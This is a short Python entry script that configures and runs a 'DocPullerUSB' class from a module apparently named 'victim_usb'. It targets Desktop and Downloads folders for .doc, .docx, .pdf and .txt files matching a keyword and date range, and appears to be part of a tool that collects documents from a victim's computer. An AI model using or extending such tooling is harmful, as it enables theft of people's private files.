
        
from docpuller_scripts.docpuller_usb.victim_usb import DocPullerUSB

def main():

    docPuller = DocPullerUSB(['Desktop', 'Downloads'], ('.doc', '.docx', '.pdf', '.txt'), ['nig'], ('2000-01-01', '2023-08-12'))

    docPuller.main()
    
    
if __name__ == '__main__':
    main();

        